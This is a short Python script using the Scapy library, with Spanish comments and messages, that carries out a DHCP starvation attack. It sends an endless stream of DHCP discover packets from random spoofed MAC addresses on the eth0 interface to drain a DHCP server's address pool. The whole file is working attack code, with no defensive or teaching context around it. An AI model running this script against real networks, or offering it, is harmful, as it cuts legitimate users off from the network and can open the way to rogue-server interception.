#!/usr/bin/env python3
from scapy.all import *
import time

def dhcp_starvation(interface):
    print("Iniciando ataque DHCP Starvation en la interfaz: " + interface)
    
    try:
        while True:
            # Generamos una MAC aleatoria
            m = RandMAC()
            
            # Construimos el paquete
            # NOTA: Usamos m tanto en Ether como en BOOTP para que sea consistente
            pkt = (Ether(src=m, dst="ff:ff:ff:ff:ff:ff") /
                   IP(src="0.0.0.0", dst="255.255.255.255") /
                   UDP(sport=68, dport=67) /
                   BOOTP(chaddr=m) /
                   DHCP(options=[("message-type", "discover"), "end"]))
            
            sendp(pkt, iface=interface, verbose=False)
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print("\nAtaque detenido por el usuario")

if __name__ == "__main__":
    # Asegúrate de que tu interfaz sea eth0
    interface_name = "eth0"
    dhcp_starvation(interface_name)